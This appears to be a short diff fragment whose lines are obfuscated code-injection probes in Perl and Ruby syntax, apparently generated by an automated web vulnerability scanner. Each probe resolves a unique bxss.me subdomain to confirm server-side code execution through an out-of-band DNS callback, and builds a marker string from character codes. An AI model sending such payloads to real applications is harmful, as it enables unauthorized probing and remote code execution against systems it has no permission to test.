@@ -1,1 +1,2 @@
-gethostbyname(lc('hitpw'.'iuwasfdod5358.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(102).chr(73).chr(101).chr(85)
+"+"A".concat(70-3).concat(22*4).concat(101).concat(79).concat(107).concat(82)+(require"socket"
+Socket.gethostbyname("hitpa"+"yrzrgklfff53b.bxss.me.")[3].to_s)+"
